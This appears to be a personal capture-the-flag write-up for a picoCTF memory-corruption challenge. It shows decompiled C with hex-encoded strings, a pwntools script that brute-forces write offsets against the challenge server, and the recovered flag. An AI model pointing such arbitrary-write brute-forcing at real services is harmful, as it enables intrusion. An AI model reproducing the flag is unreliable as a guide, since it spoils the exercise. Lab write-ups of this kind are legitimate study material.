---
ai_date: '2025-04-27 05:29:09'
ai_summary: 'Buffer overflow exploitation with brute force, discovered flag: picoCTF{5c9838eff837a883a30c38001280f07d}'
ai_tags:
- bof
- brute
- rop
created: 2024-06-15T20:56
updated: 2024-06-15T21:03
---

```cpp
var_78h = (char *)0x2073692073696874;
var_70h = 0x6d6f646e61722061;
var_68h = 0x2e676e6972747320;
var_60h._0_1_ = 0;
var_a0h = 0;
for (var_a4h = 0; var_a4h < 7; var_a4h = var_a4h + 1) {
	ptr = (char *)malloc(0x80);
	if (var_a0h == 0) {
	var_a0h = (uint64_t)ptr;
	}
	*(undefined8 *)ptr = 0x73746172676e6f43;
	*(undefined8 *)((int64_t)ptr + 8) = 0x662072756f592021;
	*(undefined8 *)((int64_t)ptr + 0x10) = 0x203a73692067616c;
	*(undefined *)((int64_t)ptr + 0x18) = 0;
	strcat(ptr, &s2);
}
var_88h = (char *)malloc(0x80);
*(undefined8 *)var_88h = 0x5420217972726f53;
*(undefined8 *)((int64_t)var_88h + 8) = 0x276e6f7720736968;
*(undefined8 *)((int64_t)var_88h + 0x10) = 0x7920706c65682074;
*(undefined4 *)((int64_t)var_88h + 0x18) = 0x203a756f;
*(undefined *)((int64_t)var_88h + 0x1c) = 0;
```

Those hex strings are suspicious.

```
 :uoy pleh t'now sihT !yrroS :si galf ruoY !stargnoC.gnirts modnar a si siht
this is a random string.Congrats! Your flag is: Sorry! This won't help you: 
```

Since inputs are relatively simple, and the program is small, I used brute force and it worked.
(I am setting every address possible to 0).

```python
from pwn import *
from tqdm import tqdm

context.log_level = 'error'
for i in tqdm(range(-5200, -5100)):
    conn  = remote('mercury.picoctf.net', 8054)
    conn.recvuntil(b'Address: ')
    conn.sendline(str(i).encode())
    conn.sendline(b'\0')
    var = conn.recvall()
    if var!=b'Value: t help you: this is a random string.\n' and var!=b'Value: timeout: the monitored command dumped core\n':
        tqdm.write(f"{i} \t {var}")
    conn.close()
```


```
-5144    b'Value: lag is: picoCTF{5c9838eff837a883a30c38001280f07d}\n'
```